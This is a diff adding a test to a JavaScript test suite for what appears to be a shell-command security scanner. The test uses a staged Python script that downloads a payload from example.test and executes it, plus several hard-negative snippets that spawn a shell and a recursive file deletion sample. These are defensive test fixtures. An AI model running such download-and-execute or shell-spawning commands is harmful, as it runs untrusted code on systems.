@@ -814,6 +814,73 @@ describe("embedded interpreter payloads", () => {
     expect(allowed.findings.some((finding) => finding.ruleId === "python.network")).toBe(true);
   });
 
+  it("reconstructs only deterministic generated Python files before trusted execution", () => {
+    const source = `
+      runtime=$(command -v python3)
+      echo 'import requests' > /tmp/stage.py
+      printf '%s\\n' 'import os' >> /tmp/stage.py
+      echo 'response = requests.get("https://example.test/payload")' >> /tmp/stage.py
+      echo 'open("/tmp/payload.sh", "wb").write(response.content)' >> /tmp/stage.py
+      echo 'os.system("sh /tmp/payload.sh")' >> /tmp/stage.py
+      $runtime /tmp/stage.py
+    `;
+    const result = scan(source);
+    expect(result.findings).toEqual(expect.arrayContaining([
+      expect.objectContaining({
+        ruleId: "escape.discovered-python-script",
+        category: "interpreter_escape",
+      }),
+      expect.objectContaining({
+        ruleId: "python.network",
+        category: "network_egress",
+        origin: expect.objectContaining({ kind: "generated-file" }),
+      }),
+      expect.objectContaining({
+        ruleId: "python.dynamic-code",
+        category: "dynamic_execution",
+        origin: expect.objectContaining({ kind: "generated-file" }),
+      }),
+      expect.objectContaining({
+        ruleId: "python.chain.download-write-execute",
+        category: "download_execution",
+        origin: expect.objectContaining({ kind: "generated-file" }),
+      }),
+    ]));
+
+    const hardNegatives = [
+      `$runtime /tmp/stage.py`,
+      `runtime=$(command -v python3); runtime=/tmp/custom
+       echo 'import os; os.system("sh")' > /tmp/stage.py
+       $runtime /tmp/stage.py`,
+      `runtime=$(command -v python3)
+       echo "import requests; requests.get('$URL')" > /tmp/stage.py
+       $runtime /tmp/stage.py`,
+      `runtime=$(command -v python3)
+       echo 'import os; os.system("sh")' >> /tmp/stage.py
+       $runtime /tmp/stage.py`,
+      `runtime=$(command -v python3)
+       echo 'import os; os.system("sh")' > /tmp/stage.py
+       echo 'print("safe")' > /tmp/stage.py
+       $runtime /tmp/stage.py`,
+      `runtime=$(command -v python3)
+       echo 'import os; os.system("sh")' > /tmp/a.py
+       $runtime /tmp/b.py`,
+      `runtime=$(command -v python3)
+       build() { echo 'import os; os.system("sh")' > /tmp/stage.py; }
+       $runtime /tmp/stage.py`,
+      `runtime=$(command -v python3)
+       echo 'import os; os.system("sh")' > /tmp/stage.py`,
+      `runtime=$(command -v python3)
+       echo 'import os; os.system("sh")' > /tmp/stage.txt
+       $runtime /tmp/stage.txt`,
+    ];
+    for (const negative of hardNegatives) {
+      expect(scan(negative).findings.some((finding) =>
+        finding.origin?.kind === "generated-file"
+      ), negative).toBe(false);
+    }
+  });
+
   it("recursively scans node -e and heredocs", () => {
     const argument = scan(`node -e "require('fs').rmSync('/tmp/x', {recursive:true})"`);
     expect(argument.findings.some((item) => item.ruleId === "javascript.destructive")).toBe(true);
